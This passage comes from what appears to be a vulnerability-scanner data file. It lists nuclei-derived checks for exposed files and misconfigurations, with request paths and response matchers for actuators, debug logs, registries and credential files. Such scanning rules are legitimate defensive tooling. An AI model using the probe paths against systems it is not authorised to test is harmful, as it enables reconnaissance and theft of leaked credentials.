        "id": 'sensitive-storage-data-expose', "name": 'Sensitive Storage Data - Detect',
        "severity": 'medium', "path": '/storage/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Sensitive Storage Data - Detect (ported from nuclei template http/exposures/files/sensitive-storage-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of', 'oauth-private.key'], 'condition': 'or'}],
    },
    {
        "id": 'craftcms-log-disclosure', "name": 'Craft CMS - Log File Disclosure',
        "severity": 'medium', "path": '/storage/logs/web.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Craft CMS - Log File Disclosure (ported from nuclei template http/exposures/logs/craftcms-log-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['craft_cms', 'UrlManager', 'schemaVersion'], 'condition': 'or'}],
    },
    {
        "id": 'opencart-error-log', "name": 'OpenCart Error Log Disclosure',
        "severity": 'medium', "path": '/system/storage/logs/error.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OpenCart Error Log Disclosure (ported from nuclei template http/exposures/logs/opencart-error-log.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['PHP Notice', 'PHP Warning', 'PHP Error', 'PHP Fatal error', 'opencart', 'catalog/controller', 'catalog/model', 'system/library'], 'condition': 'or'}],
    },
    {
        "id": 'tcpconfig', "name": 'Rockwell Automation TCP/IP Configuration Information - Detect',
        "severity": 'medium', "path": '/tcpconfig.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Rockwell Automation TCP/IP Configuration Information - Detect (ported from nuclei template http/misconfiguration/tcpconfig.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['TCP/IP Configuration'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-telescope', "name": 'Laravel Telescope Disclosure',
        "severity": 'medium', "path": '/telescope/requests',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Telescope Disclosure (ported from nuclei template http/exposures/logs/laravel-telescope.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Telescope</title>', 'Requests', 'Commands', 'Schedule'], 'condition': 'or'}],
    },
    {
        "id": 'perfsonar-toolkit', "name": 'perfSONAR Toolkit - Exposure',
        "severity": 'medium', "path": '/toolkit/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'perfSONAR Toolkit - Exposure (ported from nuclei template http/misconfiguration/perfsonar-toolkit.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>perfSONAR Toolkit</title>'], 'condition': 'or'}],
    },
    {
        "id": 'transmission-dashboard', "name": 'Transmission Dashboard - Detect',
        "severity": 'medium', "path": '/transmission/web/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Transmission Dashboard - Detect (ported from nuclei template http/misconfiguration/transmission-dashboard.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['The Transmission Project', 'Transmission Web Interface', 'Transmission'], 'condition': 'or'}],
    },
    {
        "id": 'exposed-nomad', "name": 'Nomad - Exposed Jobs',
        "severity": 'medium', "path": '/ui/jobs',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Nomad - Exposed Jobs (ported from nuclei template http/misconfiguration/nomad-jobs.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Nomad', 'nomad-ui'], 'condition': 'or'}],
    },
    {
        "id": 'php-user-ini-disclosure', "name": 'Php User.ini Disclosure',
        "severity": 'medium', "path": '/user.ini',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Php User.ini Disclosure (ported from nuclei template http/exposures/files/php-user-ini-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['assert', 'highlight', 'opcache', 'mssql', 'oci8', 'agent'], 'condition': 'or'}],
    },
    {
        "id": 'docker-registry', "name": 'Docker Registry Listing',
        "severity": 'medium', "path": '/v2/_catalog',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Docker Registry Listing (ported from nuclei template http/misconfiguration/docker-registry.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"repositories":'], 'condition': 'or'}],
    },
    {
        "id": 'imprivata-installer', "name": 'Imprivata Appliance Installation Exposure',
        "severity": 'medium', "path": '/wizard/base.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Imprivata Appliance Installation Exposure (ported from nuclei template http/misconfiguration/installer/imprivata-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Appliance Setup Wizard', 'Imprivata'], 'condition': 'or'}],
    },
    {
        "id": 'nextgen-gallery-pro-error-log', "name": 'WordPress NextGEN Gallery Pro - Error Log Disclosure',
        "severity": 'medium', "path": '/wp-content/debug.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'WordPress NextGEN Gallery Pro - Error Log Disclosure (ported from nuclei template http/misconfiguration/wordpress/nextgen-gallery-pro-error-log.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['nextgen'], 'condition': 'or'}],
    },
    {
        "id": 'wordfence-config-disclosure', "name": 'WordPress Wordfence - Configuration File Disclosure',
        "severity": 'medium', "path": '/wp-content/wflogs/config.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'WordPress Wordfence - Configuration File Disclosure (ported from nuclei template http/misconfiguration/wordpress/wordfence-config-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['plugins/wordfence', 'authKey"'], 'condition': 'or'}],
    },
    {
        "id": 'wordfence-rules-disclosure', "name": 'WordPress Wordfence - Rules File Disclosure',
        "severity": 'medium', "path": '/wp-content/wflogs/rules.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'WordPress Wordfence - Rules File Disclosure (ported from nuclei template http/misconfiguration/wordpress/wordfence-rules-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['wfWAFrule'], 'condition': 'or'}],
    },
    {
        "id": 'hp-ilo-serial-key-disclosure', "name": 'HP iLO Serial Key - Detect',
        "severity": 'medium', "path": '/xmldata?item=CpqKey',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'HP iLO Serial Key - Detect (ported from nuclei template http/exposures/configs/hp-ilo-serial-key-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['LTYPE', 'LNAME'], 'condition': 'or'}],
    },
    {
        "id": 'xprober-service', "name": 'X Prober Server - Information Disclosure',
        "severity": 'medium', "path": '/xprober.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'X Prober Server - Information Disclosure (ported from nuclei template http/exposures/configs/xprober-service.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"appName":"X Prober"', '<title>X Prober'], 'condition': 'or'}],
    },
    {
        "id": 'zabbix-dashboards-access', "name": 'zabbix-dashboards-access',
        "severity": 'medium', "path": '/zabbix/zabbix.php?action=dashboard.list',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'zabbix-dashboards-access (ported from nuclei template http/misconfiguration/zabbix-dashboards-access.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Create dashboard', 'Zabbix SIA'], 'condition': 'or'}],
    },
    {
        "id": 'editor-exposure', "name": 'Editor Configuration File - Detect',
        "severity": 'low', "path": '/.editorconfig',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Editor Configuration File - Detect (ported from nuclei template http/exposures/configs/editor-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['= true', 'indent_style'], 'condition': 'or'}],
    },
    {
        "id": 'firebase-detect', "name": 'firebase detect',
        "severity": 'low', "path": '/.settings/rules.json?auth=FIREBASE_SECRET',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'firebase detect (ported from nuclei template http/technologies/google/firebase-detect.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Could not parse auth token'], 'condition': 'or'}],
    },
    {
        "id": 'wordpress-wp-env-exposure', "name": 'WordPress Configuration wp-env - Exposure',
        "severity": 'low', "path": '/.wp-env.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'WordPress Configuration wp-env - Exposure (ported from nuclei template http/exposures/configs/wordpress-wp-env-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"phpVersion"', '"plugins"', '"themes"'], 'condition': 'or'}],
    },
    {
        "id": 'exposed-bitkeeper', "name": 'BitKeeper Configuration - Detect',
        "severity": 'low', "path": '/BitKeeper/etc/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'BitKeeper Configuration - Detect (ported from nuclei template http/exposures/configs/exposed-bitkeeper.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['BitKeeper configuration', 'logging', 'description'], 'condition': 'or'}],
    },
    {
        "id": '3cx-config', "name": '3CX Config - File Disclosure',
        "severity": 'low', "path": '/SetupConfig.xml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": '3CX Config - File Disclosure (ported from nuclei template http/exposures/configs/3cx-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<SetupConfig'], 'condition': 'or'}],
    },
    {
        "id": 'elasticsearch', "name": 'ElasticSearch Information Disclosure',
        "severity": 'low', "path": '/_cluster/health?pretty',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ElasticSearch Information Disclosure (ported from nuclei template http/misconfiguration/elasticsearch.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"took":', '"number" :', '"number_of_nodes"', 'application/vnd.api+json'], 'condition': 'or'}],
    },
    {
        "id": 'ms-front-page-misconfig', "name": 'Microsoft FrontPage Configuration - Exposure',
        "severity": 'low', "path": '/_vti_inf.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Microsoft FrontPage Configuration - Exposure (ported from nuclei template http/misconfiguration/microsoft/ms-front-page-misconfig.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['vti_extenderversion:', 'FPVersion=', 'PasswordDir:', 'Catalog for database:'], 'condition': 'or'}],
    },
    {
        "id": 'airflow-debug', "name": 'Airflow Debug Trace',
        "severity": 'low', "path": '/admin/airflow/login',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Airflow Debug Trace (ported from nuclei template http/misconfiguration/airflow/airflow-debug.yaml)',
        "matchers": [{'type': 'status', 'status': [200, 500]}, {'type': 'word', 'part': 'all', 'words': ['<h1> Ooops. </h1>', 'Traceback (most recent call last)'], 'condition': 'or'}],
    },
    {
        "id": 'keycloak-admin-console-config', "name": 'Keycloak Admin Console Configuration Disclosure',
        "severity": 'low', "path": '/admin/master/console/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Keycloak Admin Console Configuration Disclosure (ported from nuclei template http/exposures/configs/keycloak-admin-console-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"realm":', '"resource":', '"auth-server-url":'], 'condition': 'or'}],
    },
    {
        "id": 'joomla-fpd', "name": 'Joomla! - Full Path Disclosure',
        "severity": 'low', "path": '/administrator/manifests/files/joomla.xml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Joomla! - Full Path Disclosure (ported from nuclei template http/misconfiguration/joomla-fpd.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<version>', '<creationDate>', '</metafile>'], 'condition': 'or'}],
    },
    {
        "id": 'sonarqube-public-projects', "name": 'Sonarqube with public projects',
        "severity": 'low', "path": '/api/components/suggestions?recentlyBrowsed=',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Sonarqube with public projects (ported from nuclei template http/misconfiguration/sonarqube-public-projects.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"results":', '"items":', '"more":'], 'condition': 'or'}],
    },
    {
        "id": 'librechat-config-exposure', "name": 'librechat - Config Exposure',
        "severity": 'low', "path": '/api/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'librechat - Config Exposure (ported from nuclei template http/exposures/configs/librechat-config-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['LibreChat', 'serverDomain', 'registrationEnabled', 'passwordResetEnabled'], 'condition': 'or'}],
    },
    {
        "id": 'jfrog-artifactory-exposure', "name": 'JFrog Artifactory Artifacts Exposure',
        "severity": 'low', "path": '/artifactory/api/repositories',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'JFrog Artifactory Artifacts Exposure (ported from nuclei template http/misconfiguration/jfrog-artifactory-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"key" :', '"type" :', '"url" :', '"packageType" :', 'application/vnd.org.jfrog.artifactory'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-autoconfig', "name": 'Detect Springboot autoconfig Actuator',
        "severity": 'low', "path": '/autoconfig',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Springboot autoconfig Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-autoconfig.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['positiveMatches', 'AuditAutoConfiguration#auditListener', 'EndpointAutoConfiguration#beansEndpoint'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-beans', "name": 'Detect Springboot Beans Actuator',
        "severity": 'low', "path": '/beans',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Springboot Beans Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-beans.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"type"', '"beans"', '"dependencies"', '"scope"', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-caches', "name": 'Springboot Actuator Caches',
        "severity": 'low', "path": '/caches',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Springboot Actuator Caches (ported from nuclei template http/misconfiguration/springboot/springboot-caches.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['cacheManagers', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json'], 'condition': 'or'}],
    },
    {
        "id": 'codeception-config', "name": 'Codeception YAML Configuration File - Detect',
        "severity": 'low', "path": '/codeception.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Codeception YAML Configuration File - Detect (ported from nuclei template http/exposures/configs/codeception-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['paths:', 'settings:'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-conditions', "name": 'Detect Springboot Conditions Actuator',
        "severity": 'low', "path": '/conditions',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Springboot Conditions Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-conditions.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"positiveMatches":{', '"unconditionalClasses":[', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-configprops', "name": 'Detect Springboot Configprops Actuator',
        "severity": 'low', "path": '/configprops',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Springboot Configprops Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-configprops.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['org.springframework.boot.actuate', 'beans', 'context', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json'], 'condition': 'or'}],
    },
    {
        "id": 'joomla-config-dist-file', "name": 'Joomla! Configuration File - Detect',
        "severity": 'low', "path": '/configuration.php-dist',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Joomla! Configuration File - Detect (ported from nuclei template http/exposures/configs/joomla-config-dist-file.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Joomla', 'JConfig', '@package'], 'condition': 'or'}],
    },
    {
        "id": 'yii-debugger', "name": 'View Yii Debugger Information',
        "severity": 'low', "path": '/debug/default/view.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'View Yii Debugger Information (ported from nuclei template http/exposures/configs/yii-debugger.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Yii Debugger</title>', 'Route', 'Time', 'Memory'], 'condition': 'or'}],
    },
    {
        "id": 'go-pprof-debug', "name": 'Go pprof Debug Page',
        "severity": 'low', "path": '/debug/pprof/heap?debug=1',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Go pprof Debug Page (ported from nuclei template http/exposures/logs/go-pprof-debug.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['heap profile:', 'Alloc'], 'condition': 'or'}],
    },
    {
        "id": 'debug-vars', "name": 'Golang Expvar - Detect',
        "severity": 'low', "path": '/debug/vars',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Golang Expvar - Detect (ported from nuclei template http/exposures/configs/debug-vars.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"memstats":', '"cmdline":'], 'condition': 'or'}],
    },
    {
        "id": 'domcfg-page', "name": 'Lotus Domino Configuration Page',
        "severity": 'low', "path": '/domcfg.nsf',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Lotus Domino Configuration Page (ported from nuclei template http/exposures/files/domcfg-page.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Web Server Configuration', 'Mapping', 'Mappings'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-dump', "name": 'Detect Springboot Dump Actuator',
        "severity": 'low', "path": '/dump',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Springboot Dump Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-dump.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['threadName', 'threadId', 'waitedTime', 'lockName', 'stackTrace', 'methodName'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-env', "name": 'Springboot Env Actuator - Detect',
        "severity": 'low', "path": '/env',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Springboot Env Actuator - Detect (ported from nuclei template http/misconfiguration/springboot/springboot-env.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['applicationConfig', 'activeProfiles', 'server.port', 'local.server.port', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v3+json'], 'condition': 'or'}],
    },
    {
        "id": 'javascript-env', "name": 'JavaScript Environment Configuration - Detect',
        "severity": 'low', "path": '/env.js',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'JavaScript Environment Configuration - Detect (ported from nuclei template http/exposures/files/javascript-env.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['module.exports', 'const audience', 'const domain', 'NODE_ENV', 'LOG_LEVEL', 'TOKEN', 'window.__ENV =', 'Bootstrap'], 'condition': 'or'}],
    },
    {
        "id": 'tomcat-cookie-exposed', "name": 'Tomcat Cookie Exposed',
        "severity": 'low', "path": '/examples/servlets/servlet/CookieExample',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Tomcat Cookie Exposed (ported from nuclei template http/misconfiguration/tomcat-cookie-exposed.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Cookies Example', 'Your browser is sending the following cookies:'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-features', "name": 'Detects Springboot Features Actuator',
        "severity": 'low', "path": '/features',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detects Springboot Features Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-features.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"enabled":[', '"disabled":[', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json'], 'condition': 'or'}],
    },
    {
        "id": 'firebase-debug-log', "name": 'Firebase Debug Log File Exposure',
        "severity": 'low', "path": '/firebase-debug.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Firebase Debug Log File Exposure (ported from nuclei template http/exposures/logs/firebase-debug-log.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[debug]', 'firebase', 'googleapis.com'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-flyway', "name": 'Springboot Flyway API',
        "severity": 'low', "path": '/flyway',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Springboot Flyway API (ported from nuclei template http/misconfiguration/springboot/springboot-flyway.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['flywayBeans', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-httpexchanges', "name": 'Detects Springboot HTTP Exchanges Actuator',
        "severity": 'low', "path": '/httpexchanges',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detects Springboot HTTP Exchanges Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-httpexchanges.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"exchanges"', '"request"', '"response"', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v3+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-httptrace', "name": 'Detect Springboot httptrace',
        "severity": 'low', "path": '/httptrace',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Springboot httptrace (ported from nuclei template http/misconfiguration/springboot/springboot-httptrace.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"traces"', '"timestamp"', '"principal"', '"session"', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json'], 'condition': 'or'}],
    },
    {
        "id": 'openstack-config', "name": 'Openstack - Infomation Disclosure',
        "severity": 'low', "path": '/info',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Openstack - Infomation Disclosure (ported from nuclei template http/misconfiguration/openstack-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['{"formpost"', '"bulk_'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-integrationgraph', "name": 'Springboot Actuator integrationgraph',
        "severity": 'low', "path": '/integrationgraph',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Springboot Actuator integrationgraph (ported from nuclei template http/misconfiguration/springboot/springboot-integrationgraph.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['provider', 'integrationPatternType', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v3+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-jolokia', "name": 'Detects Springboot Jolokia Actuator',
        "severity": 'low', "path": '/jolokia',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detects Springboot Jolokia Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-jolokia.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"config":{', '"agentId":"', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v3+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-liquidbase', "name": 'Springboot Liquidbase API',
        "severity": 'low', "path": '/liquibase',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Springboot Liquidbase API (ported from nuclei template http/misconfiguration/springboot/springboot-liquidbase.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['liquibase', '"FILENAME":"', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-logfile', "name": 'Detects Springboot Logfile Actuator',
        "severity": 'low', "path": '/logfile',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detects Springboot Logfile Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-logfile.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['springframework.web.HttpRequestMethodNotSupportedException', 'INFO'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-loggers', "name": 'Springboot Loggers - Exposure',
        "severity": 'low', "path": '/loggers',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Springboot Loggers - Exposure (ported from nuclei template http/misconfiguration/springboot/springboot-loggers.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"levels"', '"configuredLevel"', '"effectiveLevel"'], 'condition': 'or'}],
    },
    {
        "id": 'vscode-mcp-json', "name": 'Visual Studio Code MCP Configuration ("mcp.json") Exposure',
        "severity": 'low', "path": '/mcp.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Visual Studio Code MCP Configuration ("mcp.json") Exposure (ported from nuclei template http/exposures/files/vscode-mcp-json.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"mcpServers": {', '"args":'], 'condition': 'or'}],
    },
    {
        "id": 'umbraco-miniprofiler-exposure', "name": 'Umbraco Mini Profiler - Exposure',
        "severity": 'low', "path": '/mini-profiler-resources/results',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Umbraco Mini Profiler - Exposure (ported from nuclei template http/misconfiguration/umbraco-miniprofiler-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['StartupProfiler', 'var profiler =', '"DurationMilliseconds"'], 'condition': 'or'}],
    },
    {
        "id": 'npm-debug-log', "name": 'NPM Debug Log Disclosure',
        "severity": 'low', "path": '/npm-debug.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'NPM Debug Log Disclosure (ported from nuclei template http/exposures/logs/npm-debug-log.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['verbose cli', 'verbose stack'], 'condition': 'or'}],
    },
    {
        "id": 'oauth-credentials-json', "name": 'Oauth Credentials Json',
        "severity": 'low', "path": '/oauth-credentials.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Oauth Credentials Json (ported from nuclei template http/exposures/files/oauth-credentials-json.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"client_id":', '"client_secret":'], 'condition': 'or'}],
    },
    {
        "id": 'platformio-ini', "name": 'Platformio Config File Disclosure',
        "severity": 'low', "path": '/platformio.ini',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Platformio Config File Disclosure (ported from nuclei template http/exposures/configs/platformio-ini.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[platformio]', 'platform =', 'board ='], 'condition': 'or'}],
    },
    {
        "id": 'prometheus-log', "name": 'Exposed Prometheus',
        "severity": 'low', "path": '/prometheus',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Exposed Prometheus (ported from nuclei template http/misconfiguration/prometheus/prometheus-log.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['gateway_request_total', 'logback_events_total'], 'condition': 'or'}],
    },
    {
        "id": 'protractor-config', "name": 'Protractor Configuration Exposure',
        "severity": 'low', "path": '/protractor.conf.js',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Protractor Configuration Exposure (ported from nuclei template http/exposures/configs/protractor-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['exports.config', 'capabilities:', 'application/javascript'], 'condition': 'or'}],
    },
    {
        "id": 'psalm-config', "name": 'Psalm Configuration Exposure - Detect',
        "severity": 'low', "path": '/psalm.xml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Psalm Configuration Exposure - Detect (ported from nuclei template http/exposures/configs/psalm-config.yaml)',
